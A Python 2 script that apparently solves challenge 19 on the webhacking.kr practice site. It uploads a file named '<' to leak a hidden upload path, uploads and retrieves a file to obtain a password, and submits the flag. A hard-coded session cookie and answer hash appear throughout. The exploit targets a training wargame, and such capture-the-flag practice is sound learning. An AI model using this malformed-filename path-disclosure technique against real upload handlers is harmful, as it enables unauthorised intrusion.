#-*- coding: utf-8 -*-
import urllib
import urllib2
import requests
import CookieManager

print "[*] Get Hidden Path"
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
challengeUrl = "http://webhacking.kr/challenge/web/web-19/"

uploadFile = {
    "up": ("<", "bindon")
}
sessionCookie = {
    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
}

httpConnection = None
try:
    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
    print httpRequest.text
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print
print "[*] Upload File"
uploadFile = {
    "up": ("bindon", "bindon")
}
sessionCookie = {
    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
}

httpConnection = None
try:
    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
    print httpRequest.text
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print
print "[*] Get Password"
challengeUrl = "http://webhacking.kr/challenge/web/web-19"
challengeUrl += "/dkanehdkftndjqtsmsdlfmadmlvhfejzzzzzzzzzkkkkkkkkggggggggg"
challengeUrl += "/bindon"

httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print "[!] Auth Flag"
challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
parameter = urllib.urlencode({
    "answer": "06d911a7bfddfd06b24352749120edab"
});
httpRequest = urllib2.Request(challengeUrl, data=parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()